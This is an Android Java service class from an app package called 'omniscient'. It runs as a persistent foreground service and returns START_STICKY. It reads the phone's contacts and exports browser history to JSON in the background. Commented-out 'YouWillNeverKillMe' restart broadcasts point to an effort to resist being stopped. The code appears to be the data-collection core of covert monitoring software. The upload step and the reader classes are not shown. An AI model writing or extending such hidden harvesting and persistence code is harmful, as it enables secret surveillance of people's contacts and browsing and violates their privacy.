package com.postal.omniscient.postal.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.support.v4.app.TaskStackBuilder;
import android.support.v4.content.AsyncTaskLoader;
import android.util.Log;
import android.widget.Toast;

import com.postal.omniscient.R;
import com.postal.omniscient.postal.browser.history.BrowserHistory;
import com.postal.omniscient.postal.reader.contact.ReadContacts;

import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.ThreadLocalRandom;

public class MyService extends Service {
    private String Msg = "MyMsg";

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        Log.i("MyMsg", "onBind");
        throw new UnsupportedOperationException("Not yet implemented");

    }

    @Override
    public void onCreate() {
        super.onCreate();

        Notification n = new Notification();
        startForeground(1989, n);

        Log.i("MyMsg", "thread onStartCommand");


//        IntentFilter intentFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
//        intentFilter.addAction(Intent.ACTION_SCREEN_OFF);
//        registerReceiver(new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context context, Intent intent) {
//                if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
//                    Log.d(Msg, Intent.ACTION_SCREEN_OFF);
//                } else if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
//                    Log.d(Msg, Intent.ACTION_SCREEN_ON);
//                }
//            }
//        }, intentFilter);

//        long sec = 1000 * 5;
//        try {
//
//             wait(sec);
//            Log.i("MyMsg", "thread start loadInBackground");
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        AsyncL as = new AsyncL(getApplicationContext());
        as.forceLoad();

//        boolean tr =true;
//        while (tr){
//
//            Log.i("MyMsg", "WEEEEE");
//        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i("MyMsg", "onDestroy");
       // sendBroadcast(new Intent("YouWillNeverKillMe"));
    }

    public class AsyncL extends AsyncTaskLoader {

        public AsyncL(Context context) {
            super(context);
        }

        @Override
        public Object loadInBackground() {

            long sec = 1000 * 2;
            try {

               // Thread.sleep(sec);

        Log.i("MyMsg", "thread start loadInBackground");

            } catch (Exception e) {
                e.printStackTrace();
            }
//            sendBroadcast(new Intent("YouWillNeverKillMe"));

//            long sec = 1000 * 5;
            try {
               // while (true) {
                    Thread.sleep(sec);
                    Log.i("MyMsg", "thread start AsyncL");
                //}
            } catch (InterruptedException e) {
                e.printStackTrace();
            }


//            Intent par = new Intent(getApplicationContext(), StartService.class);
//            startService(par); Залоченый безконечный цыкл
//            par = null;
            ReadContacts contact = new ReadContacts(getApplicationContext());
            BrowserHistory browser = new BrowserHistory(getContentResolver());
            contact.getContacts();
            browser.historyToJson();
            return null;
        }

        @Override
        public void onCanceled(Object data) {
            super.onCanceled(data);
            Log.i("MyMsg", "thread start onCancelLoad");
        }

    }
}